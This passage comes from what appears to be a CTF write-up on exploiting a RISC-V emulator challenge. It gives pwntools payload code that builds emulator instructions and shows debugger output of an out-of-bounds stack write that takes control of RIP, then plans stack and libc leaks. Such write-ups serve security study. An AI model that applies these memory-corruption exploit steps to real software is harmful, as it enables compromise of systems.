</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_inst</span><span class="p">(</span><span class="mh">0x03</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">addr_reg</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="n">reg_target</span><span class="p">,</span> <span class="n">imm_i</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_ADDI</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_inst</span><span class="p">(</span><span class="mh">0x13</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">src</span><span class="p">,</span> <span class="n">imm_i</span><span class="o">=</span><span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_SLLI</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_inst</span><span class="p">(</span><span class="mh">0x13</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">src</span><span class="p">,</span> <span class="n">imm_i</span><span class="o">=</span><span class="n">shift</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_SUBW</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">reg_src</span><span class="p">,</span> <span class="n">reg_src2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_inst</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">reg_src</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">reg_src2</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The helper above is built based on inspecting how the <code>cpu_execute</code> function processes the instructions bytecode from the input file. Now that we have set the appropriate helper, let&rsquo;s try to execute it for the first time to build our first payload to test it. Below is the example code that I used during analyzing the code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tempfile</span> <span class="kn">import</span> <span class="n">NamedTemporaryFile</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">temp_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">temp_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">temp_file</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">temp_file</span><span class="o">.</span><span class="n">name</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Temp filename: </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running the above code, it will generate a temp file, and then we can use the temp file to run the <code>main</code> in a separate terminal. Trying to use the generated temp file, below is the example output of the emulator</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x80000000 -&gt; addi
</span></span><span class="line"><span class="cl">   zero: 00                s0: 00                a6: 00                 s8: 00
</span></span><span class="line"><span class="cl">     ra: 00                s1: 00                a7: 00                 s9: 00
</span></span><span class="line"><span class="cl">     sp: 0x80100000        a0: 0x41              s2: 00                s10: 00
</span></span><span class="line"><span class="cl">     gp: 00                a1: 00                s3: 00                s11: 00
</span></span><span class="line"><span class="cl">     tp: 00                a2: 00                s4: 00                 t3: 00
</span></span><span class="line"><span class="cl">     t0: 00                a3: 00                s5: 00                 t4: 00
</span></span><span class="line"><span class="cl">     t1: 00                a4: 00                s6: 00                 t5: 00
</span></span><span class="line"><span class="cl">     t2: 00                a5: 00                s7: 00                 t6: 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have successfully changed the <code>a0</code> value to <code>0x41</code>. Now, notice that the <code>sp</code> register value is <code>0x80100000</code>. Remember that the max size of array <code>mem</code> is <code>0x100000</code>, and if we try to access the memory of the address <code>0x80100000</code>, that means we will try to get the value of <code>mem[addr-DRAM_BASE]</code>, which is <code>mem[0x100000]</code>. For example, if we try to increase the <code>sp</code> value by <code>0x10</code>, that means we have achieved OOB access.</p>
<p>Let&rsquo;s try to check it by using this payload.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_LD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x58</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">))</span> <span class="c1"># We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above payload trying to store <code>0x41414141</code> to <code>mem[sp+0x8]</code>. <code>exec_ADDI</code> only support 12-bit signed number based on my observation in the source code, so to set <code>a0</code> value, I use the help of <code>&lt;&lt; 8</code>. Let&rsquo;s try to inspect it in gdb to check where our <code>0x41414141</code> value is stored.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; search -4 0x41414141
</span></span><span class="line"><span class="cl">Searching for value: b&#39;AAAA&#39;
</span></span><span class="line"><span class="cl">[stack]         0x7fffffef54a0 0x41414141 /* &#39;AAAA&#39; */
</span></span><span class="line"><span class="cl">[stack]         0x7fffffffd490 0x41414141 /* &#39;AAAA&#39; */
</span></span><span class="line"><span class="cl">pwndbg&gt; tele 0x7fffffffd480 10
</span></span><span class="line"><span class="cl">00:0000│  0x7fffffffd480 —▸ 0x7fffffffd580 ◂— 0x2
</span></span><span class="line"><span class="cl">01:0008│  0x7fffffffd488 ◂— 0xfdc8b2d89266d800
</span></span><span class="line"><span class="cl">02:0010│  0x7fffffffd490 ◂— 0x41414141 /* &#39;AAAA&#39; */
</span></span><span class="line"><span class="cl">03:0018│  0x7fffffffd498 —▸ 0x7ffff7dfa083 (__libc_start_main+243) ◂— mov edi, eax
</span></span><span class="line"><span class="cl">04:0020│  0x7fffffffd4a0 ◂— 0x21 /* &#39;!&#39; */
</span></span><span class="line"><span class="cl">05:0028│  0x7fffffffd4a8 —▸ 0x7fffffffd588 —▸ 0x7fffffffd904 ◂— &#39;/home/chovid99/ctf-journey/2023/hacktm/cs2100/chal/main_patched&#39;
</span></span><span class="line"><span class="cl">06:0030│  0x7fffffffd4b0 ◂— 0x2f7fbe7a0
</span></span><span class="line"><span class="cl">07:0038│  0x7fffffffd4b8 —▸ 0x555555555367 (main) ◂— push rbp
</span></span><span class="line"><span class="cl">08:0040│  0x7fffffffd4c0 —▸ 0x5555555586d0 (__libc_csu_init) ◂— push r15
</span></span><span class="line"><span class="cl">09:0048│  0x7fffffffd4c8 ◂— 0x2f49796781749cb6
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on that inspection, <code>mem</code> array is reside in stack, and <code>mem[0x100000+0x10]</code> is pointing to the stored RBP. Notice that <code>mem[0x100000+0x8]</code> is canary value, and <code>mem[0x100000+0x18]</code> is stored RIP. That means, if we try to overwrite it, we will get RIP Control. Let&rsquo;s modify our payload to overwrite the stored RIP address instead.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># Shift left &lt;&lt; 8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a0&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_LD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x58</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a1&#39;</span><span class="p">))</span> <span class="c1"># We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And below is the gdb result</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mh">0x80000020</span> <span class="o">-&gt;</span> <span class="n">ld</span>
</span></span><span class="line"><span class="cl">   <span class="n">zero</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s0</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a6</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">s8</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">ra</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s1</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a7</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">s9</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">sp</span><span class="p">:</span> <span class="mh">0x80100000</span>        <span class="n">a0</span><span class="p">:</span> <span class="mh">0x41414141</span>        <span class="n">s2</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s10</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">gp</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a1</span><span class="p">:</span> <span class="mh">0x7fffffffd580</span>     <span class="n">s3</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s11</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">tp</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a2</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s4</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">t3</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">t0</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a3</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s5</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">t4</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">t1</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a4</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s6</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">t5</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">     <span class="n">t2</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">a5</span><span class="p">:</span> <span class="mi">00</span>                <span class="n">s7</span><span class="p">:</span> <span class="mi">00</span>                 <span class="n">t6</span><span class="p">:</span> <span class="mi">00</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Program</span> <span class="n">received</span> <span class="k">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x0000000041414141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RAX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">RBX</span>  <span class="mh">0x5555555586d0</span> <span class="p">(</span><span class="n">__libc_csu_init</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span> <span class="n">r15</span>
</span></span><span class="line"><span class="cl"> <span class="n">RCX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RDX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RDI</span>  <span class="mh">0x7ffff7fc47e0</span> <span class="p">(</span><span class="n">_IO_stdfile_1_lock</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RSI</span>  <span class="mh">0x55555555920d</span> <span class="err">◂—</span> <span class="mh">0x45205d2d5b000000</span>
</span></span><span class="line"><span class="cl"> <span class="n">R8</span>   <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl"> <span class="n">R9</span>   <span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"> <span class="n">R10</span>  <span class="mh">0x55555555920d</span> <span class="err">◂—</span> <span class="mh">0x45205d2d5b000000</span>
</span></span><span class="line"><span class="cl"> <span class="n">R11</span>  <span class="mh">0x555555559048</span> <span class="err">◂—</span> <span class="mh">0x335b1b006d305b1b</span>
</span></span><span class="line"><span class="cl"> <span class="n">R12</span>  <span class="mh">0x555555555120</span> <span class="p">(</span><span class="n">_start</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">xor</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl"> <span class="n">R13</span>  <span class="mh">0x7fffffffd580</span> <span class="err">◂—</span> <span class="mh">0x2</span>
</span></span><span class="line"><span class="cl"> <span class="n">R14</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">R15</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RBP</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RSP</span>  <span class="mh">0x7fffffffd4a0</span> <span class="err">◂—</span> <span class="mh">0x21</span> <span class="o">/*</span> <span class="s1">&#39;!&#39;</span> <span class="o">*/</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RIP</span>  <span class="mh">0x41414141</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Invalid</span> <span class="n">address</span> <span class="mh">0x41414141</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>That confirms our hypothesis. We&rsquo;re now able to control RIP. Now it&rsquo;s time for us to leak some value. We can use the help of <code>exec_LD</code> to do this. But first, let&rsquo;s try to inspect for values around the stack.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele 0x7fffffffd480+0x58
</span></span><span class="line"><span class="cl">00:0000│  0x7fffffffd4d8 —▸ 0x7fffffffd580 ◂— 0x2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; tele 0x7fffffffd480-0x2a8
</span></span><span class="line"><span class="cl">00:0000│  0x7fffffffd1d8 —▸ 0x7ffff7ddb2d0 ◂— 0xf0012000032a5
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found a good address to get a stack address leak and libc address leak. To get the leak is very simple, we just need to:</p>
<ul>
<li>Set one register value to <code>0x80100000+0x58</code>, and then call <code>exec_LD</code> to get that address value. We will get stack address leak</li>
<li>Set one register value to <code>0x80100000-0x2a8</code>, and then call <code>exec_LD</code> to get that address value. We will get libc base</li>
</ul>
<p>Now that we can get some leak, I notice that the SUB function in the code is not working. But we can use <code>exec_ADDI</code> with negative 12-bit number to do subtraction. For example, look at this payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Set t2 = 0x800ffd58. We will use this to leak libc base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0x0f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;t2&#39;</span><span class="p">),</span> <span class="mh">0xfd</span><span class="p">)</span>
